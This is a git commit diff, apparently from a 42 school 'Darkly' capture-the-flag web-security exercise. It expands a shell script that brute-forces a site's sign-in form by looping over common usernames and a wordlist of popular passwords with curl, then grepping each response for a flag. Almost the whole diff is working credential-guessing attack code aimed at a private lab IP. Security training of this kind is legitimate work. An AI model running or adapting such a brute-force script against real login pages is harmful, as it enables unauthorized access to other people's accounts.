dd3e6dbe7bf7b33df21f90fb3125a5c227fc7351
thifranc <thifranc@student.42.fr>
2017-09-20 16:37:35 +0200

    dur de bruteforce

--- signIn/brute.sh
+++ signIn/brute.sh
@@ -1,10 +1,53 @@
-commonPasswd=('123456', '123456789', 'qwerty', 'password', '1234567890', '111111', '987654321', 'qwertyuiop', 'mynoob', '123321', '654321', '1q2w3e4r');
-commonLogin=('admin', 'root');
+#!/bin/sh
+commonPasswd=('123456'
+'123456789'
+'qwerty'
+'12345678'
+'111111'
+'1234567890'
+'1234567'
+'rockyou'
+'password'
+'123123'
+'987654321'
+'qwertyuiop'
+'mynoob'
+'123321'
+'666666'
+'18atcskd2w'
+'7777777'
+'1q2w3e4r'
+'654321'
+'555555'
+'3rjs1la7qe'
+'google'
+'1q2w3e4r5t'
+'123qwe'
+'zxcvbnm'
+'1q2w3e'
+'root'
+'admin'
+'dragon'
+'123456'
+'12345'
+'123456789'
+'Password'
+'iloveyou'
+'princess'
+'rockyou'
+'1234567'
+'12345678'
+'abc123'
+);
+
+commonLogin=('dragon' 'user' 'flag' 'darkly' 'login' 'username' 'marvin' 'prism' 'root' 'admin');
+#tested for : 'root' 'admin' 'dragon' 'user' 'flag' 'darkly' 'login' 'username' 'marvin' 'laurie' 'zaz' 'thor' 'ly' 'mathieu' 'prism'
 
 for login in "${commonLogin[@]}"
 do
 	for passwd in "${commonPasswd[@]}"
 	do
-		curl "http://10.11.200.246/?page=signin&username=$login&password=$passwd&Login=Login#"
+		echo "testing $login with $passwd"
+		curl -s "http://10.11.200.246/?page=signin&username=$login&password=$passwd&Login=Login#" | grep -i "flag"
 	done
 done
